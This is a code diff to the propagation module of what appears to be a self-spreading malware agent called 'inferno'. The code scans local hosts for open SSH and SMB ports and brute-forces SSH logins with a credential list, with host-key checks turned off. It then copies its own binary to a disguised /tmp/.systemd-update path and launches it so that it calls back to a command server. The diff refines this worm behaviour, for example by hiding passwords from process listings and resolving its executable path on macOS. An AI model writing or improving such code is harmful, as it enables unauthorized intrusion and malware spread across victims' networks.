@@ -2,6 +2,10 @@
 #include "../include/ShellExecutor.hpp"
 #include <sstream>
 #include <cstdlib>
+#if defined(__APPLE__)
+#include <mach-o/dyld.h>
+#include <limits.h>
+#endif
 
 namespace inferno {
 
@@ -34,7 +38,7 @@ Propagator::Result Propagator::scan() {
     std::string port_scan = "for ip in $(arp -a 2>/dev/null | awk '{print $2}' | tr -d '()' || "
                             "echo '172.17.0.1'); do "
                             "  for port in 22 445; do "
-                            "    (echo >/dev/tcp/$ip/$port) 2>/dev/null && "
+                            "    nc -z -w 1 \"$ip\" \"$port\" 2>/dev/null && "
                             "    echo \"$ip:$port open\"; "
                             "  done; "
                             "done 2>/dev/null || true";
@@ -62,7 +66,7 @@ Propagator::Result Propagator::brute(const std::string& target) {
     for (const auto& [user, pass] : creds) {
         // SSH brute
         {
-            std::string cmd = "sshpass -p '" + pass + "' ssh -o StrictHostKeyChecking=no "
+            std::string cmd = "SSHPASS=" + pass + " sshpass -e ssh -o StrictHostKeyChecking=no "
                               "-o ConnectTimeout=3 " + user + "@" + target +
                               " 'id' 2>/dev/null";
             ShellExecutor::Result r = shell.execute(cmd);
@@ -100,8 +104,19 @@ Propagator::Result Propagator::deploy(const std::string& target) {
 #ifdef __linux__
     self_path = "/proc/self/exe";
 #elif defined(__APPLE__)
-    self_path = "/proc/self/exe"; // fallback; actually use _NSGetExecutablePath
-    self_path = "/tmp/.SpotlightIndex"; // placeholder
+    {
+        char path_buf[PATH_MAX];
+        uint32_t size = sizeof(path_buf);
+        if (_NSGetExecutablePath(path_buf, &size) == 0) {
+            char* resolved = realpath(path_buf, nullptr);
+            if (resolved) {
+                self_path = resolved;
+                free(resolved);
+            } else {
+                self_path = path_buf;
+            }
+        }
+    }
 #else
     self_path = "inferno_client.exe";
 #endif
@@ -131,7 +146,7 @@ Propagator::Result Propagator::deploy(const std::string& target) {
 
     // Upload agent via SCP
     {
-        std::string cmd = "sshpass -p '" + pass + "' scp -o StrictHostKeyChecking=no "
+        std::string cmd = "SSHPASS=" + pass + " sshpass -e scp -o StrictHostKeyChecking=no "
                           "-o ConnectTimeout=10 "
                           "\"" + self_path + "\" "
                           + user + "@" + target + ":/tmp/.systemd-update 2>/dev/null";
@@ -145,7 +160,7 @@ Propagator::Result Propagator::deploy(const std::string& target) {
     // Execute remotely via SSH
     {
         std::string server_ip = "127.0.0.1"; // placeholder — will be set by Agent
-        std::string cmd = "sshpass -p '" + pass + "' ssh -o StrictHostKeyChecking=no "
+        std::string cmd = "SSHPASS=" + pass + " sshpass -e ssh -o StrictHostKeyChecking=no "
                           "-o ConnectTimeout=10 " + user + "@" + target +
                           " 'chmod +x /tmp/.systemd-update && "
                           "nohup /tmp/.systemd-update " + server_ip + " 8080 >/dev/null 2>&1 &' "
